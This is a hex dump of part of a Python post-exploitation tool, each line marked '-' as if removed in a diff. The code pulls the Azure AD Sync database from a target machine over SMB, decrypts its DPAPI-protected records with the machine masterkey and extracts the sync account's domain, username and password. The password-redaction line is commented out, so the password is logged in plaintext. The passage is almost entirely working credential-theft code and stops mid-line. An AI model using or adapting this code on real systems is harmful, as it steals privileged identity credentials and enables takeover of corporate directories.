-000062e0: 2320 696e 6669 6c65 203d 2063 6f64 6563  # infile = codec
-000062f0: 732e 6f70 656e 2827 6164 7379 6e63 5f65  s.open('adsync_e
-00006300: 7870 6f72 7427 2c20 2772 272c 2063 6f64  xport', 'r', cod
-00006310: 6563 290a 0909 0923 2065 6e75 6d74 6172  ec)....# enumtar
-00006320: 6765 7420 3d20 696e 6669 6c65 0a09 0909  get = infile....
-00006330: 2323 2323 2323 0a0a 0909 0966 6f72 206c  ######.....for l
-00006340: 696e 6520 696e 2065 6e75 6d74 6172 6765  ine in enumtarge
-00006350: 743a 0a09 0909 0974 7279 3a0a 0909 0909  t:.....try:.....
-00006360: 096c 7479 7065 2c20 6461 7461 203d 206c  .ltype, data = l
-00006370: 696e 652e 7374 7269 7028 292e 7370 6c69  ine.strip().spli
-00006380: 7428 273a 2027 290a 0909 0909 6578 6365  t(': ').....exce
-00006390: 7074 2056 616c 7565 4572 726f 723a 0a09  pt ValueError:..
-000063a0: 0909 0909 636f 6e74 696e 7565 0a09 0909  ....continue....
-000063b0: 096c 7479 7065 203d 206c 7479 7065 2e72  .ltype = ltype.r
-000063c0: 6570 6c61 6365 2875 275c 7566 6566 6627  eplace(u'\ufeff'
-000063d0: 2c20 7527 2729 0a09 0909 0969 6620 6c74  , u'').....if lt
-000063e0: 7970 652e 6c6f 7765 7228 2920 3d3d 2027  ype.lower() == '
-000063f0: 7265 636f 7264 273a 0a09 0909 0909 786d  record':......xm
-00006400: 6c64 6174 612c 2063 7279 7074 6564 6461  ldata, cryptedda
-00006410: 7461 203d 2064 6174 612e 7370 6c69 7428  ta = data.split(
-00006420: 273b 2729 0a09 0909 0909 6f75 745b 2763  ';')......out['c
-00006430: 7279 7074 6564 7265 636f 7264 7327 5d2e  ryptedrecords'].
-00006440: 6170 7065 6e64 2863 7279 7074 6564 6461  append(cryptedda
-00006450: 7461 290a 0909 0909 096f 7574 5b27 786d  ta)......out['xm
-00006460: 6c64 6174 6127 5d2e 6170 7065 6e64 2878  ldata'].append(x
-00006470: 6d6c 6461 7461 290a 0909 0909 2320 7072  mldata).....# pr
-00006480: 696e 7428 6622 7265 636f 7264 2066 6f75  int(f"record fou
-00006490: 6e64 203a 207b 786d 6c64 6174 617d 2229  nd : {xmldata}")
-000064a0: 0a0a 0909 0909 6966 206c 7479 7065 2e6c  ......if ltype.l
-000064b0: 6f77 6572 2829 203d 3d20 2763 6f6e 6669  ower() == 'confi
-000064c0: 6727 3a0a 0909 0909 0969 6e73 7461 6e63  g':......instanc
-000064d0: 652c 206b 6579 7365 745f 6964 2c20 656e  e, keyset_id, en
-000064e0: 7472 6f70 7920 3d20 6461 7461 2e73 706c  tropy = data.spl
-000064f0: 6974 2827 3b27 290a 0909 0909 096f 7574  it(';')......out
-00006500: 5b27 696e 7374 616e 6365 275d 203d 2069  ['instance'] = i
-00006510: 6e73 7461 6e63 650a 0909 0909 096f 7574  nstance......out
-00006520: 5b27 6b65 7973 6574 5f69 6427 5d20 3d20  ['keyset_id'] = 
-00006530: 6b65 7973 6574 5f69 640a 0909 0909 096f  keyset_id......o
-00006540: 7574 5b27 656e 7472 6f70 7927 5d20 3d20  ut['entropy'] = 
-00006550: 656e 7472 6f70 790a 0909 0923 2069 6620  entropy....# if 
-00006560: 7365 6c66 2e5f 5f6f 7074 696f 6e73 2e66  self.__options.f
-00006570: 726f 6d5f 6669 6c65 3a0a 0909 0923 0969  rom_file:....#.i
-00006580: 6e66 696c 652e 636c 6f73 6528 290a 0909  nfile.close()...
-00006590: 0923 2043 6865 636b 2069 6620 616c 6c20  .# Check if all 
-000065a0: 7661 6c75 6573 2061 7265 2069 6e20 7468  values are in th
-000065b0: 6520 6f75 7464 6174 610a 0909 0972 6571  e outdata....req
-000065c0: 7569 7265 6420 3d20 5b27 6372 7970 7465  uired = ['crypte
-000065d0: 6472 6563 6f72 6473 272c 2027 786d 6c64  drecords', 'xmld
-000065e0: 6174 6127 2c20 2769 6e73 7461 6e63 6527  ata', 'instance'
-000065f0: 2c20 276b 6579 7365 745f 6964 272c 2027  , 'keyset_id', '
-00006600: 656e 7472 6f70 7927 5d0a 0909 0966 6f72  entropy']....for
-00006610: 206f 7074 696f 6e20 696e 2072 6571 7569   option in requi
-00006620: 7265 643a 0a09 0909 0969 6620 6e6f 7420  red:.....if not 
-00006630: 6f70 7469 6f6e 2069 6e20 6f75 743a 0a09  option in out:..
-00006640: 0909 0909 6c6f 6767 696e 672e 6572 726f  ....logging.erro
-00006650: 7228 0a09 0909 0909 0927 4d69 7373 696e  r(.......'Missin
-00006660: 6720 6461 7461 2066 726f 6d20 6461 7461  g data from data
-00006670: 6261 7365 2e20 4f70 7469 6f6e 2025 7320  base. Option %s 
-00006680: 636f 756c 6420 6e6f 7420 6265 2065 7874  could not be ext
-00006690: 7261 6374 6564 2e20 4368 6563 6b20 796f  racted. Check yo
-000066a0: 7572 2064 6174 6162 6173 6520 6f72 206f  ur database or o
-000066b0: 7574 7075 7420 6669 6c65 2e27 2c0a 0909  utput file.',...
-000066c0: 0909 0909 6f70 7469 6f6e 290a 0909 0909  ....option).....
-000066d0: 0972 6574 7572 6e20 4e6f 6e65 0a09 0909  .return None....
-000066e0: 7265 7475 726e 206f 7574 0a09 0965 7863  return out...exc
-000066f0: 6570 7420 4578 6365 7074 696f 6e20 6173  ept Exception as
-00006700: 2065 783a 0a09 0909 7365 6c66 2e6c 6f67   ex:....self.log
-00006710: 6769 6e67 2e64 6562 7567 280a 0909 0909  ging.debug(.....
-00006720: 6622 5b7b 7365 6c66 2e6f 7074 696f 6e73  f"[{self.options
-00006730: 2e74 6172 6765 745f 6970 7d5d 207b 6263  .target_ip}] {bc
-00006740: 6f6c 6f72 732e 5741 524e 494e 477d 4578  olors.WARNING}Ex
-00006750: 6365 7074 696f 6e20 696e 2050 6172 7369  ception in Parsi
-00006760: 6e67 2064 6174 6162 6173 6520 3a20 506c  ng database : Pl
-00006770: 6561 7365 206d 616e 7561 6c79 2072 756e  ease manualy run
-00006780: 2041 4453 796e 6351 7565 7279 2e65 7865   ADSyncQuery.exe
-00006790: 2041 4453 796e 632e 6d64 6620 3e20 6164   ADSync.mdf > ad
-000067a0: 7379 6e63 5f65 7870 6f72 7420 6f6e 2061  sync_export on a
-000067b0: 2077 696e 646f 7773 2065 6e76 2077 6974   windows env wit
-000067c0: 6820 4d53 5351 4c20 7375 7070 6f72 747b  h MSSQL support{
-000067d0: 6263 6f6c 6f72 732e 454e 4443 7d22 290a  bcolors.ENDC}").
-000067e0: 0909 0973 656c 662e 6c6f 6767 696e 672e  ...self.logging.
-000067f0: 6465 6275 6728 6578 290a 0a09 6465 6620  debug(ex)...def 
-00006800: 4765 745f 4144 5f43 6f6e 6e65 6374 2873  Get_AD_Connect(s
-00006810: 656c 662c 2075 7365 722c 206c 6f63 616c  elf, user, local
-00006820: 6669 6c65 2c20 6461 7461 293a 0a09 0923  file, data):...#
-00006830: 204c 6f63 616c 2044 5041 5049 2065 7874   Local DPAPI ext
-00006840: 7261 6374 6564 2064 6174 610a 0909 696e  racted data...in
-00006850: 666f 203d 2022 220a 0909 7061 7274 7320  fo = ""...parts 
-00006860: 3d20 6461 7461 5b27 5461 7267 6574 275d  = data['Target']
-00006870: 2e64 6563 6f64 6528 2775 7466 2d31 366c  .decode('utf-16l
-00006880: 6527 295b 3a2d 315d 2e73 706c 6974 2827  e')[:-1].split('
-00006890: 5f27 290a 0909 6c6f 6361 6c42 6c6f 6264  _')...localBlobd
-000068a0: 6174 6173 203d 207b 0a09 0909 2769 6e73  atas = {....'ins
-000068b0: 7461 6e63 6569 6427 3a20 7061 7274 735b  tanceid': parts[
-000068c0: 335d 5b31 3a2d 315d 2e6c 6f77 6572 2829  3][1:-1].lower()
-000068d0: 2c0a 0909 0927 6b65 7973 6574 5f69 6427  ,....'keyset_id'
-000068e0: 3a20 7061 7274 735b 345d 2c0a 0909 0927  : parts[4],....'
-000068f0: 6461 7461 273a 2064 6174 615b 2755 6e6b  data': data['Unk
-00006900: 6e6f 776e 3327 5d0a 0909 7d0a 0909 2320  nown3']...}...# 
-00006910: 7072 696e 7428 6c6f 6361 6c42 6c6f 6264  print(localBlobd
-00006920: 6174 6173 290a 0a09 0923 2041 4443 6f6e  atas)....# ADCon
-00006930: 6e65 6374 2044 6174 6162 6173 6520 6461  nect Database da
-00006940: 7461 0a09 096c 6f67 6769 6e67 2e64 6562  ta...logging.deb
-00006950: 7567 2866 225b 7b73 656c 662e 6f70 7469  ug(f"[{self.opti
-00006960: 6f6e 732e 7461 7267 6574 5f69 707d 5d20  ons.target_ip}] 
-00006970: 7b62 636f 6c6f 7273 2e4f 4b42 4c55 457d  {bcolors.OKBLUE}
-00006980: 2054 7279 696e 6720 746f 2067 6574 2041   Trying to get A
-00006990: 4443 6f6e 6e65 6374 2061 6363 6f75 6e74  DConnect account
-000069a0: 7b62 636f 6c6f 7273 2e45 4e44 437d 2229  {bcolors.ENDC}")
-000069b0: 0a09 0974 7279 3a0a 0909 0923 2053 746f  ...try:....# Sto
-000069c0: 7020 5365 7276 6963 6520 2f20 446f 776e  p Service / Down
-000069d0: 6c6f 6164 2044 4220 2f20 5374 6172 7420  load DB / Start 
-000069e0: 4442 0a09 0909 6d79 4144 5352 656d 6f74  DB....myADSRemot
-000069f0: 654f 7073 203d 2041 4453 5265 6d6f 7465  eOps = ADSRemote
-00006a00: 4f70 6572 6174 696f 6e73 2873 6d62 436f  Operations(smbCo
-00006a10: 6e6e 6563 7469 6f6e 3d73 656c 662e 736d  nnection=self.sm
-00006a20: 622c 2064 6f4b 6572 6265 726f 733d 4661  b, doKerberos=Fa
-00006a30: 6c73 6529 0a09 0909 6d79 4144 5352 656d  lse)....myADSRem
-00006a40: 6f74 654f 7073 2e67 6174 6865 7241 6453  oteOps.gatherAdS
-00006a50: 796e 634d 6462 2829 0a09 0909 2320 6669  yncMdb()....# fi
-00006a60: 6c65 735f 746f 5f64 6c3d 5b27 5072 6f67  les_to_dl=['Prog
-00006a70: 7261 6d20 4669 6c65 735c 5c4d 6963 726f  ram Files\\Micro
-00006a80: 736f 6674 2041 7a75 7265 2041 4420 5379  soft Azure AD Sy
-00006a90: 6e63 5c5c 4461 7461 5c5c 4144 5379 6e63  nc\\Data\\ADSync
-00006aa0: 2e6d 6466 272c 2750 726f 6772 616d 2046  .mdf','Program F
-00006ab0: 696c 6573 5c5c 4d69 6372 6f73 6f66 7420  iles\\Microsoft 
-00006ac0: 417a 7572 6520 4144 2053 796e 635c 5c44  Azure AD Sync\\D
-00006ad0: 6174 615c 5c41 4453 796e 635f 6c6f 672e  ata\\ADSync_log.
-00006ae0: 6c64 6627 5d0a 0909 096d 6462 6461 7461  ldf']....mdbdata
-00006af0: 203d 2073 656c 662e 6765 744d 6462 4461   = self.getMdbDa
-00006b00: 7461 2829 0a09 0909 6966 206d 6462 6461  ta()....if mdbda
-00006b10: 7461 2069 7320 4e6f 6e65 3a0a 0909 0909  ta is None:.....
-00006b20: 6c6f 6767 696e 672e 6465 6275 6728 6622  logging.debug(f"
-00006b30: 5b7b 7365 6c66 2e6f 7074 696f 6e73 2e74  [{self.options.t
-00006b40: 6172 6765 745f 6970 7d5d 2043 6f75 6c64  arget_ip}] Could
-00006b50: 206e 6f74 2065 7874 7261 6374 2072 6571   not extract req
-00006b60: 7569 7265 6420 6461 7461 6261 7365 2069  uired database i
-00006b70: 6e66 6f72 6d61 7469 6f6e 2e20 4578 6974  nformation. Exit
-00006b80: 696e 6722 290a 0909 0909 7265 7475 726e  ing").....return
-00006b90: 0a09 0923 2070 7269 6e74 286d 6462 6461  ...# print(mdbda
-00006ba0: 7461 290a 0909 6578 6365 7074 2045 7863  ta)...except Exc
-00006bb0: 6570 7469 6f6e 2061 7320 6578 3a0a 0909  eption as ex:...
-00006bc0: 0973 656c 662e 6c6f 6767 696e 672e 6465  .self.logging.de
-00006bd0: 6275 6728 0a09 0909 0966 225b 7b73 656c  bug(.....f"[{sel
-00006be0: 662e 6f70 7469 6f6e 732e 7461 7267 6574  f.options.target
-00006bf0: 5f69 707d 5d20 7b62 636f 6c6f 7273 2e57  _ip}] {bcolors.W
-00006c00: 4152 4e49 4e47 7d45 7863 6570 7469 6f6e  ARNING}Exception
-00006c10: 2069 6e20 4144 5352 656d 6f74 654f 7065   in ADSRemoteOpe
-00006c20: 7261 7469 6f6e 7320 317b 6263 6f6c 6f72  rations 1{bcolor
-00006c30: 732e 454e 4443 7d22 290a 0909 0973 656c  s.ENDC}")....sel
-00006c40: 662e 6c6f 6767 696e 672e 6465 6275 6728  f.logging.debug(
-00006c50: 6578 290a 0a09 0972 6573 756c 7420 3d20  ex)....result = 
-00006c60: 6c6f 6361 6c42 6c6f 6264 6174 6173 0a09  localBlobdatas..
-00006c70: 0969 6620 7265 7375 6c74 2069 7320 6e6f  .if result is no
-00006c80: 7420 4e6f 6e65 3a0a 0909 0969 6620 7265  t None:....if re
-00006c90: 7375 6c74 5b27 6b65 7973 6574 5f69 6427  sult['keyset_id'
-00006ca0: 5d20 213d 206d 6462 6461 7461 5b27 6b65  ] != mdbdata['ke
-00006cb0: 7973 6574 5f69 6427 5d20 6f72 2072 6573  yset_id'] or res
-00006cc0: 756c 745b 2769 6e73 7461 6e63 6569 6427  ult['instanceid'
-00006cd0: 5d20 213d 206d 6462 6461 7461 5b27 696e  ] != mdbdata['in
-00006ce0: 7374 616e 6365 275d 3a0a 0909 0909 6c6f  stance']:.....lo
-00006cf0: 6767 696e 672e 6465 6275 6728 2746 6f75  gging.debug('Fou
-00006d00: 6e64 206b 6579 7365 7420 2573 2069 6e73  nd keyset %s ins
-00006d10: 7461 6e63 6520 2573 2c20 6275 7420 6e65  tance %s, but ne
-00006d20: 6564 206b 6579 7365 7420 2573 2069 6e73  ed keyset %s ins
-00006d30: 7461 6e63 6520 2573 2e20 5472 7969 6e67  tance %s. Trying
-00006d40: 206e 6578 7427 2c0a 0909 0909 0909 0920   next',........ 
-00006d50: 2072 6573 756c 745b 276b 6579 7365 745f   result['keyset_
-00006d60: 6964 275d 2c20 7265 7375 6c74 5b27 696e  id'], result['in
-00006d70: 7374 616e 6365 6964 275d 2c20 6d64 6264  stanceid'], mdbd
-00006d80: 6174 615b 276b 6579 7365 745f 6964 275d  ata['keyset_id']
-00006d90: 2c20 6d64 6264 6174 615b 2769 6e73 7461  , mdbdata['insta
-00006da0: 6e63 6527 5d29 0a09 0909 656c 7365 3a0a  nce'])....else:.
-00006db0: 0909 0909 6c6f 6767 696e 672e 6465 6275  ....logging.debu
-00006dc0: 6728 2746 6f75 6e64 2063 6f72 7265 6374  g('Found correct
-00006dd0: 2065 6e63 7279 7074 6564 206b 6579 7365   encrypted keyse
-00006de0: 7420 746f 2064 6563 7279 7074 2064 6174  t to decrypt dat
-00006df0: 6127 290a 0909 6966 2072 6573 756c 7420  a')...if result 
-00006e00: 6973 204e 6f6e 653a 0a09 0909 6c6f 6767  is None:....logg
-00006e10: 696e 672e 6465 6275 6728 2746 6169 6c65  ing.debug('Faile
-00006e20: 6420 746f 2066 696e 6420 636f 7272 6563  d to find correc
-00006e30: 7420 6b65 7973 6574 2064 6174 6127 290a  t keyset data').
-00006e40: 0909 0972 6574 7572 6e0a 0a09 0923 2063  ...return....# c
-00006e50: 7279 7074 6b65 7973 203d 205b 7365 6c66  ryptkeys = [self
-00006e60: 2e5f 5f72 656d 6f74 654f 7073 2e64 6563  .__remoteOps.dec
-00006e70: 7279 7074 4470 6170 6942 6c6f 6253 7973  ryptDpapiBlobSys
-00006e80: 7465 6d6b 6579 2872 6573 756c 745b 2764  temkey(result['d
-00006e90: 6174 6127 5d2c 2073 656c 662e 6470 6170  ata'], self.dpap
-00006ea0: 6953 7973 7465 6d5b 274d 6163 6869 6e65  iSystem['Machine
-00006eb0: 4b65 7927 5d2c 7374 7269 6e67 5f74 6f5f  Key'],string_to_
-00006ec0: 6269 6e28 6d64 6264 6174 615b 2765 6e74  bin(mdbdata['ent
-00006ed0: 726f 7079 275d 2929 5d0a 0909 6d79 6f70  ropy']))]...myop
-00006ee0: 7469 6f6e 7320 3d20 636f 7079 2e64 6565  tions = copy.dee
-00006ef0: 7063 6f70 7928 7365 6c66 2e6f 7074 696f  pcopy(self.optio
-00006f00: 6e73 290a 0909 6d79 6f70 7469 6f6e 732e  ns)...myoptions.
-00006f10: 6669 6c65 203d 204e 6f6e 6520 2023 2022  file = None  # "
-00006f20: 6b65 795f 6d61 7465 7269 616c 2e74 6d70  key_material.tmp
-00006f30: 2220 2023 2042 4c4f 4220 746f 2070 6172  "  # BLOB to par
-00006f40: 7365 0a09 096d 796f 7074 696f 6e73 2e6b  se...myoptions.k
-00006f50: 6579 203d 204e 6f6e 650a 0909 6d79 6f70  ey = None...myop
-00006f60: 7469 6f6e 732e 6d61 7374 6572 6b65 7973  tions.masterkeys
-00006f70: 203d 204e 6f6e 6520 2023 2075 7365 722e   = None  # user.
-00006f80: 6d61 7374 6572 6b65 7973 5f66 696c 650a  masterkeys_file.
-00006f90: 0909 6d79 6470 6170 6920 3d20 4450 4150  ..mydpapi = DPAP
-00006fa0: 4928 6d79 6f70 7469 6f6e 732c 2073 656c  I(myoptions, sel
-00006fb0: 662e 6c6f 6767 696e 6729 0a09 0967 7569  f.logging)...gui
-00006fc0: 6420 3d20 6d79 6470 6170 692e 6669 6e64  d = mydpapi.find
-00006fd0: 5f42 6c6f 625f 6d61 7374 6572 6b65 7928  _Blob_masterkey(
-00006fe0: 7261 775f 6461 7461 3d72 6573 756c 745b  raw_data=result[
-00006ff0: 2764 6174 6127 5d29 0a09 0973 656c 662e  'data'])...self.
-00007000: 6c6f 6767 696e 672e 6465 6275 6728 6622  logging.debug(f"
-00007010: 5b7b 7365 6c66 2e6f 7074 696f 6e73 2e74  [{self.options.t
-00007020: 6172 6765 745f 6970 7d5d 204c 6f6f 6b69  arget_ip}] Looki
-00007030: 6e67 2066 6f72 2041 4443 6f6e 6e65 6374  ng for ADConnect
-00007040: 206d 6173 7465 726b 6579 203a 207b 6775   masterkey : {gu
-00007050: 6964 7d22 290a 0909 6966 2067 7569 6420  id}")...if guid 
-00007060: 213d 204e 6f6e 653a 0a09 0909 6d61 6368  != None:....mach
-00007070: 696e 655f 7573 6572 203d 2075 7365 7220  ine_user = user 
-00007080: 3d20 7365 6c66 2e47 6574 5573 6572 4279  = self.GetUserBy
-00007090: 4e61 6d65 2827 4d41 4348 494e 4524 2729  Name('MACHINE$')
-000070a0: 0a09 0909 6d61 7374 6572 6b65 7920 3d20  ....masterkey = 
-000070b0: 7365 6c66 2e67 6574 5f6d 6173 7465 726b  self.get_masterk
-000070c0: 6579 2875 7365 723d 6d61 6368 696e 655f  ey(user=machine_
-000070d0: 7573 6572 2c20 6775 6964 3d67 7569 642c  user, guid=guid,
-000070e0: 2074 7970 653d 274d 4143 4849 4e45 2729   type='MACHINE')
-000070f0: 0a09 0909 6966 206d 6173 7465 726b 6579  ....if masterkey
-00007100: 2021 3d20 4e6f 6e65 3a0a 0909 0909 6966   != None:.....if
-00007110: 206d 6173 7465 726b 6579 5b27 7374 6174   masterkey['stat
-00007120: 7573 275d 203d 3d20 2764 6563 7279 7074  us'] == 'decrypt
-00007130: 6564 273a 0a09 0909 0909 6d79 6470 6170  ed':......mydpap
-00007140: 692e 6f70 7469 6f6e 732e 6b65 7920 3d20  i.options.key = 
-00007150: 6d61 7374 6572 6b65 795b 276b 6579 275d  masterkey['key']
-00007160: 0a09 0909 0909 2320 6372 6564 5f64 6174  ......# cred_dat
-00007170: 6120 3d20 6d79 6470 6170 692e 6465 6372  a = mydpapi.decr
-00007180: 7970 745f 6372 6564 656e 7469 616c 2829  ypt_credential()
-00007190: 0a09 0909 0909 6372 7970 746b 6579 7320  ......cryptkeys 
-000071a0: 3d20 5b0a 0909 0909 0909 6d79 6470 6170  = [.......mydpap
-000071b0: 692e 6465 6372 7970 745f 626c 6f62 2872  i.decrypt_blob(r
-000071c0: 6177 5f64 6174 613d 7265 7375 6c74 5b27  aw_data=result['
-000071d0: 6461 7461 275d 2c20 656e 7472 6f70 793d  data'], entropy=
-000071e0: 7374 7269 6e67 5f74 6f5f 6269 6e28 6d64  string_to_bin(md
-000071f0: 6264 6174 615b 2765 6e74 726f 7079 275d  bdata['entropy']
-00007200: 2929 5d0a 0909 0909 0974 7279 3a0a 0909  ))]......try:...
-00007210: 0909 0909 6c6f 6767 696e 672e 6465 6275  ....logging.debu
-00007220: 6728 6627 4465 6372 7970 7469 6e67 2065  g(f'Decrypting e
-00007230: 6e63 7279 7074 6564 2041 4420 5379 6e63  ncrypted AD Sync
-00007240: 2063 6f6e 6669 6775 7261 7469 6f6e 2064   configuration d
-00007250: 6174 6120 7769 7468 207b 6372 7970 746b  ata with {cryptk
-00007260: 6579 737d 2729 0a09 0909 0909 0966 6f72  eys}').......for
-00007270: 2069 6e64 6578 2c20 7265 636f 7264 2069   index, record i
-00007280: 6e20 656e 756d 6572 6174 6528 6d64 6264  n enumerate(mdbd
-00007290: 6174 615b 2763 7279 7074 6564 7265 636f  ata['cryptedreco
-000072a0: 7264 7327 5d29 3a0a 0909 0909 0909 0923  rds']):........#
-000072b0: 2054 7279 2064 6563 7279 7074 696e 6720   Try decrypting 
-000072c0: 7769 7468 2068 6967 6865 7374 2063 7279  with highest cry
-000072d0: 7074 6b65 7920 7265 636f 7264 0a09 0909  ptkey record....
-000072e0: 0909 0909 7365 6c66 2e6c 6f67 6769 6e67  ....self.logging
-000072f0: 2e64 6562 7567 2866 225b 7b73 656c 662e  .debug(f"[{self.
-00007300: 6f70 7469 6f6e 732e 7461 7267 6574 5f69  options.target_i
-00007310: 707d 5d20 7b69 6e64 6578 7d20 2d20 7b72  p}] {index} - {r
-00007320: 6563 6f72 647d 2229 0a09 0909 0909 0909  ecord}")........
-00007330: 6472 6563 6f72 6420 3d20 4475 6d70 5365  drecord = DumpSe
-00007340: 6372 6574 732e 6465 6372 7970 7428 7265  crets.decrypt(re
-00007350: 636f 7264 2c20 6372 7970 746b 6579 735b  cord, cryptkeys[
-00007360: 2d31 5d29 2e72 6570 6c61 6365 2827 5c78  -1]).replace('\x
-00007370: 3030 272c 2027 2729 0a09 0909 0909 0909  00', '')........
-00007380: 2320 7072 696e 7428 6472 6563 6f72 6429  # print(drecord)
-00007390: 0a09 0909 0909 0909 7769 7468 206f 7065  ........with ope
-000073a0: 6e28 2772 2564 5f78 6d6c 5f64 6174 612e  n('r%d_xml_data.
-000073b0: 786d 6c27 2025 2069 6e64 6578 2c20 2777  xml' % index, 'w
-000073c0: 2729 2061 7320 6f75 7466 696c 653a 0a09  ') as outfile:..
-000073d0: 0909 0909 0909 0964 6174 6120 3d20 6261  .......data = ba
-000073e0: 7365 3634 2e62 3634 6465 636f 6465 286d  se64.b64decode(m
-000073f0: 6462 6461 7461 5b27 786d 6c64 6174 6127  dbdata['xmldata'
-00007400: 5d5b 696e 6465 785d 292e 6465 636f 6465  ][index]).decode
-00007410: 2827 7574 662d 3136 2d6c 6527 290a 0909  ('utf-16-le')...
-00007420: 0909 0909 0909 6f75 7466 696c 652e 7772  ......outfile.wr
-00007430: 6974 6528 6461 7461 290a 0909 0909 0909  ite(data).......
-00007440: 0977 6974 6820 6f70 656e 2827 7225 645f  .with open('r%d_
-00007450: 656e 6372 7970 7465 645f 6461 7461 2e78  encrypted_data.x
-00007460: 6d6c 2720 2520 696e 6465 782c 2027 7727  ml' % index, 'w'
-00007470: 2920 6173 206f 7574 6669 6c65 3a0a 0909  ) as outfile:...
-00007480: 0909 0909 0909 6f75 7466 696c 652e 7772  ......outfile.wr
-00007490: 6974 6528 6472 6563 6f72 6429 0a09 0909  ite(drecord)....
-000074a0: 0909 0909 6374 7265 6520 3d20 4554 2e66  ....ctree = ET.f
-000074b0: 726f 6d73 7472 696e 6728 6472 6563 6f72  romstring(drecor
-000074c0: 6429 0a09 0909 0909 0909 6474 7265 6520  d)........dtree 
-000074d0: 3d20 4554 2e66 726f 6d73 7472 696e 6728  = ET.fromstring(
-000074e0: 6461 7461 290a 0909 0909 0909 0969 6620  data)........if 
-000074f0: 2766 6f72 6573 742d 6c6f 6769 6e2d 7573  'forest-login-us
-00007500: 6572 2720 696e 2064 6174 613a 0a09 0909  er' in data:....
-00007510: 0909 0909 096c 6f67 6769 6e67 2e64 6562  .....logging.deb
-00007520: 7567 2827 4c6f 6361 6c20 4144 2063 7265  ug('Local AD cre
-00007530: 6465 6e74 6961 6c73 2729 0a09 0909 0909  dentials')......
-00007540: 0909 0965 6c20 3d20 6474 7265 652e 6669  ...el = dtree.fi
-00007550: 6e64 2822 2e2f 2f70 6172 616d 6574 6572  nd(".//parameter
-00007560: 5b40 6e61 6d65 3d27 666f 7265 7374 2d6c  [@name='forest-l
-00007570: 6f67 696e 2d64 6f6d 6169 6e27 5d22 290a  ogin-domain']").
-00007580: 0909 0909 0909 0909 6966 2065 6c20 6973  ........if el is
-00007590: 206e 6f74 204e 6f6e 653a 0a09 0909 0909   not None:......
-000075a0: 0909 0909 6c6f 6767 696e 672e 6465 6275  ....logging.debu
-000075b0: 6728 275c 7444 6f6d 6169 6e3a 2025 7327  g('\tDomain: %s'
-000075c0: 2c20 656c 2e74 6578 7429 0a09 0909 0909  , el.text)......
-000075d0: 0909 0909 7573 6572 6e61 6d65 203d 2065  ....username = e
-000075e0: 6c2e 7465 7874 0a09 0909 0909 0909 0965  l.text.........e
-000075f0: 6c20 3d20 6474 7265 652e 6669 6e64 2822  l = dtree.find("
-00007600: 2e2f 2f70 6172 616d 6574 6572 5b40 6e61  .//parameter[@na
-00007610: 6d65 3d27 666f 7265 7374 2d6c 6f67 696e  me='forest-login
-00007620: 2d75 7365 7227 5d22 290a 0909 0909 0909  -user']").......
-00007630: 0909 6966 2065 6c20 6973 206e 6f74 204e  ..if el is not N
-00007640: 6f6e 653a 0a09 0909 0909 0909 0909 7573  one:..........us
-00007650: 6572 6e61 6d65 202b 3d20 272f 2720 2b20  ername += '/' + 
-00007660: 656c 2e74 6578 740a 0909 0909 0909 0923  el.text........#
-00007670: 206c 6f67 6769 6e67 2e64 6562 7567 2827   logging.debug('
-00007680: 5c74 5573 6572 6e61 6d65 3a20 2573 272c  \tUsername: %s',
-00007690: 2065 6c2e 7465 7874 290a 0909 0909 0909   el.text).......
-000076a0: 0965 6c73 653a 0a09 0909 0909 0909 0923  .else:.........#
-000076b0: 2041 7373 756d 6520 4141 4420 636f 6e66   Assume AAD conf
-000076c0: 6967 0a09 0909 0909 0909 096c 6f67 6769  ig.........loggi
-000076d0: 6e67 2e64 6562 7567 2827 417a 7572 6520  ng.debug('Azure 
-000076e0: 4144 2063 7265 6465 6e74 6961 6c73 2729  AD credentials')
-000076f0: 0a09 0909 0909 0909 0965 6c20 3d20 6474  .........el = dt
-00007700: 7265 652e 6669 6e64 2822 2e2f 2f70 6172  ree.find(".//par
-00007710: 616d 6574 6572 5b40 6e61 6d65 3d27 5573  ameter[@name='Us
-00007720: 6572 4e61 6d65 275d 2229 0a09 0909 0909  erName']")......
-00007730: 0909 0969 6620 656c 2069 7320 6e6f 7420  ...if el is not 
-00007740: 4e6f 6e65 3a0a 0909 0909 0909 0909 0975  None:..........u
-00007750: 7365 726e 616d 6520 3d20 656c 2e74 6578  sername = el.tex
-00007760: 740a 0909 0909 0909 0909 096c 6f67 6769  t..........loggi
-00007770: 6e67 2e64 6562 7567 2827 5c74 5573 6572  ng.debug('\tUser
-00007780: 6e61 6d65 3a20 2573 272c 2065 6c2e 7465  name: %s', el.te
-00007790: 7874 290a 0909 0909 0909 0923 2043 616e  xt)........# Can
-000077a0: 2062 6520 6569 7468 6572 206c 6f77 6572   be either lower
-000077b0: 206f 7220 7769 7468 2063 6170 6974 616c   or with capital
-000077c0: 2050 0a09 0909 0909 0909 6670 7720 3d20   P........fpw = 
-000077d0: 4e6f 6e65 0a09 0909 0909 0909 656c 203d  None........el =
-000077e0: 2063 7472 6565 2e66 696e 6428 222e 2f2f   ctree.find(".//
-000077f0: 6174 7472 6962 7574 655b 406e 616d 653d  attribute[@name=
-00007800: 2750 6173 7377 6f72 6427 5d22 290a 0909  'Password']")...
-00007810: 0909 0909 0969 6620 656c 2069 7320 6e6f  .....if el is no
-00007820: 7420 4e6f 6e65 3a0a 0909 0909 0909 0909  t None:.........
-00007830: 6670 7720 3d20 656c 2e74 6578 740a 0909  fpw = el.text...
-00007840: 0909 0909 0965 6c20 3d20 6374 7265 652e  .....el = ctree.
-00007850: 6669 6e64 2822 2e2f 2f61 7474 7269 6275  find(".//attribu
-00007860: 7465 5b40 6e61 6d65 3d27 7061 7373 776f  te[@name='passwo
-00007870: 7264 275d 2229 0a09 0909 0909 0909 6966  rd']")........if
-00007880: 2065 6c20 6973 206e 6f74 204e 6f6e 653a   el is not None:
-00007890: 0a09 0909 0909 0909 0966 7077 203d 2065  .........fpw = e
-000078a0: 6c2e 7465 7874 0a09 0909 0909 0909 6966  l.text........if
-000078b0: 2066 7077 3a0a 0909 0909 0909 0909 2320   fpw:.........# 
-000078c0: 6670 7720 3d20 6670 775b 3a6c 656e 2866  fpw = fpw[:len(f
-000078d0: 7077 292f 325d 202b 2027 2e2e 2e5b 5245  pw)/2] + '...[RE
-000078e0: 4441 4354 4544 5d27 0a09 0909 0909 0909  DACTED]'........
-000078f0: 096c 6f67 6769 6e67 2e64 6562 7567 2827  .logging.debug('
-00007900: 5c74 5061 7373 776f 7264 3a20 2573 272c  \tPassword: %s',
-00007910: 2066 7077 290a 0909 0909 0909 0909 696e   fpw).........in
-00007920: 666f 202b 3d20 6622 7b75 7365 726e 616d  fo += f"{usernam
